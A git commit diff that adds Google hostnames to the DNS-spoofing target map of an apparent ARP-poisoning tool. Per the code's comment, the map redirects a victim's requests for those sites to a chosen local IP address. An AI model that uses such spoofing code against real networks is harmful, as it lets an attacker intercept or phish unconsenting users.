2b3ac100d482e0aefa8b14a21cda9cd4dc1888d8
Lizard <41330651+Ben-0-mad@users.noreply.github.com>
2023-06-08 22:38:42 +0200

    Try fix DNS spoofing

--- ARPP_V1.0.2.py
+++ ARPP_V1.0.2.py
@@ -452,6 +452,8 @@ class ARPP(object):
         """
         # a dictionary of sites that if the victim tries to access them they are directed to the wrong IP address
         target_sites_map = {b"google.com.":"192.168.178.217",\
+            b"www.google.com.":"192.168.178.217",\
+            b"www.google.com":"192.168.178.217",\
             b"test.nl":"192.168.178.217"}
         target_sites=list(target_sites_map.keys())
         fake_ips = list(target_sites_map.values())
